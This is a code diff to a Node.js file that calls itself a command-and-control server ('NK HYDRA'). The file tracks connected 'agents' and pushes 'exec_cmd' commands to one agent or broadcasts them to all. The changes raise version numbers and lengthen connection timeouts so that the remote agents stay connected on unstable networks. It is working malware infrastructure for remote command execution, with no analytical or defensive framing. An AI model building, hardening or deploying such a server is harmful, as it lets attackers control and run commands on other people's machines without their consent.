@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v111.0 [OMNI BROADCAST]
+// NK HYDRA v113.0 [STABILITY BROADCAST]
 
 const express = require('express');
 const http = require('http');
@@ -9,13 +9,15 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.send('HYDRA C2 v111.0 [OMNI BROADCAST]'); });
+app.get('/', (req, res) => { res.send('HYDRA C2 v113.0 [STABILITY MODE]'); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingInterval: 10000,
-    pingTimeout: 5000
+    // INCREASED TIMEOUTS FOR UNSTABLE NETWORKS / RENDER SLEEP
+    pingInterval: 25000, 
+    pingTimeout: 120000, // 2 Minutes tolerance before disconnect
+    transports: ['polling', 'websocket']
 });
 
 let agents = []; 
@@ -63,8 +65,6 @@ io.on('connection', (socket) => {
         io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });
 
         if (targetId === 'all') {
-            // FIX: io.emit sends to everyone connected to default namespace. 
-            // This guarantees the Python agent receives it if connected.
             io.emit('exec_cmd', { cmd });
         } else {
             const target = agents.find(a => a.id === targetId);
@@ -88,4 +88,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v111 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v113 LISTENING ON ${PORT}`));
